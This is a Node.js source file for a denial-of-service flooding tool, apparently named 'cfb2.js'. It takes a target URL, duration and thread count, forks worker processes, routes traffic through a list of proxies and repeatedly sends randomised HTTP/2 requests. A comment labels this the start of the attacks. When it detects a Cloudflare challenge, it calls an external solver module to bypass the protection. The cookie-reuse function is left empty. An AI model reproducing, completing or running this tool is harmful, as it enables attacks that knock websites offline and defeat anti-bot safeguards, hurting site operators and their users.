const net = require('net');
const tls = require('tls');
const http2 = require('http2');
const cluster = require('cluster');
const CloudFlareSolver = require('./solver.js');

if (process.argv.length < 5) {
    console.log('Usage: node cfb2.js <url> <time> <threads>');
    process.exit();
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    threads: parseInt(process.argv[4])
};

const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0'
];

const paths = ['/', '/home', '/index', '/api/data', '/products'];

function getRandomUserAgent() {
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function getRandomPath() {
    return paths[Math.floor(Math.random() * paths.length)];
}

if (cluster.isMaster) {
    console.log(`[TWIST] Target: ${args.target}`);
    console.log(`[TWIST] Time: ${args.time}s | Threads: ${args.threads}`);
    
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        console.log(`[TWIST] Finished`);
        process.exit();
    }, args.time * 1000);
}

if (!cluster.isMaster) {
    let proxies = [];
    try {
        proxies = require('fs').readFileSync('proxy.txt', 'utf8')
            .split('\n')
            .filter(p => p.trim())
            .map(p => {
                const [host, port] = p.split(':');
                return { host, port: parseInt(port) };
            });
    } catch (e) {}

    let solvedChallenges = 0;

    async function createRequest() {
        const proxy = proxies.length > 0 ? proxies[Math.floor(Math.random() * proxies.length)] : null;
        
        try {
            // Coba request normal dulu
            const result = await makeNormalRequest(proxy);
            
            if (result.challengeDetected) {
                console.log('[TWIST] CloudFlare challenge detected, solving...');
                const solverResult = await CloudFlareSolver.solve(args.target, proxy);
                
                if (solverResult.success) {
                    solvedChallenges++;
                    console.log(`[TWIST] Challenge solved! Total: ${solvedChallenges}`);
                    
                    // Gunakan cookies dari solver untuk request berikutnya
                    await makeRequestWithCookies(proxy, solverResult.cookies);
                }
            }
        } catch (error) {
            // Silent error
        }
    }

    function makeNormalRequest(proxy) {
        return new Promise((resolve) => {
            const socket = proxy ? 
                net.connect(proxy.port, proxy.host) : 
                net.connect(443, new URL(args.target).hostname);

            function setupTLS() {
                const tlsConn = tls.connect({
                    socket: socket,
                    servername: new URL(args.target).hostname,
                    ALPNProtocols: ['h2', 'http/1.1'],
                    rejectUnauthorized: false
                });

                tlsConn.on('secureConnect', () => {
                    const client = http2.connect(args.target, {
                        createConnection: () => tlsConn
                    });

                    client.on('connect', () => {
                        const headers = {
                            ':method': 'GET',
                            ':path': getRandomPath(),
                            ':authority': new URL(args.target).hostname,
                            ':scheme': 'https',
                            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'user-agent': getRandomUserAgent()
                        };

                        const req = client.request(headers);
                        let responseData = '';

                        req.on('response', (headers) => {
                            const status = headers[':status'];
                            
                            req.on('data', (chunk) => {
                                responseData += chunk.toString();
                            });

                            req.on('end', () => {
                                const challengeDetected = 
                                    responseData.includes('cf-challenge') ||
                                    responseData.includes('captcha') ||
                                    responseData.includes('jschallenge') ||
                                    status === '503';

                                resolve({ 
                                    challengeDetected, 
                                    status, 
                                    data: responseData 
                                });

                                req.close();
                                client.close();
                                socket.destroy();
                            });
                        });

                        req.on('error', () => {
                            resolve({ challengeDetected: false });
                            client.close();
                            socket.destroy();
                        });

                        req.end();
                    });

                    client.on('error', () => {
                        resolve({ challengeDetected: false });
                        socket.destroy();
                    });
                });

                tlsConn.on('error', () => {
                    resolve({ challengeDetected: false });
                    socket.destroy();
                });
            }

            if (proxy) {
                socket.on('connect', () => {
                    socket.write(`CONNECT ${new URL(args.target).hostname}:443 HTTP/1.1\r\nHost: ${new URL(args.target).hostname}:443\r\n\r\n`);
                });

                socket.on('data', (data) => {
                    if (data.toString().includes('200')) {
                        setupTLS();
                    }
                });
            } else {
                socket.on('connect', setupTLS);
            }

            socket.on('error', () => {
                resolve({ challengeDetected: false });
                socket.destroy();
            });
            
            socket.setTimeout(10000, () => {
                resolve({ challengeDetected: false });
                socket.destroy();
            });
        });
    }

    function makeRequestWithCookies(proxy, cookies) {
        
    }

    // Start attacks
    for (let i = 0; i < 3; i++) {
        setInterval(createRequest, Math.random() * 2000 + 1000);
    }
}